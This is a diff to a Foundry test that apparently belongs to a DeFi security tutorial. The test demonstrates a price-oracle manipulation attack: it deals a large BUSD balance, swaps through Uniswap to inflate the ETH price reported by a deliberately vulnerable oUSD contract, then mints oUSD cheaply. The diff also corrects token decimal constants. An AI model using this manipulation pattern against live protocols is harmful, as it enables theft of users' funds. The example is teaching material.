@@ -3,7 +3,19 @@
 pragma solidity ^0.8.21;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
-import "../src/Oracle.sol";
+import "../vulnerability-example/Vulnerability.sol"; // from the "Oracle Vulnerabilities" step
+
+interface IBUSD is IERC20 {}
+
+interface IUniswapV2Router {
+    function swapExactTokensForTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+}
 
 contract OracleTest is Test {
     address private constant alice = address(1);
@@ -11,7 +23,6 @@ contract OracleTest is Test {
     address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
     address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
     IUniswapV2Router router;
-    IWETH private weth = IWETH(WETH);
     IBUSD private busd = IBUSD(BUSD);
     string MAINNET_RPC_URL;
     oUSD ousd;
@@ -31,7 +42,7 @@ contract OracleTest is Test {
         uint256 priceBefore = ousd.getPrice();
         console.log("1. ETH Price (before attack): %s", priceBefore);
         // Give yourself 1,000,000 BUSD
-        uint busdAmount = 1_000_000 * 10e18;
+        uint busdAmount = 1_000_000 * 1e18;
         deal(BUSD, alice, busdAmount);
         // 2. Buy WETH with BUSD to manipulate the oracle
         vm.prank(alice);
@@ -43,7 +54,7 @@ contract OracleTest is Test {
         console.log("3. ETH price (after attack): %s", priceAfter);
         // 4. Mint oUSD
         ousd.swap{value: 1 ether}();
-        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18);
+        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/1e18);
     }
 
     // Swap BUSD to WETH
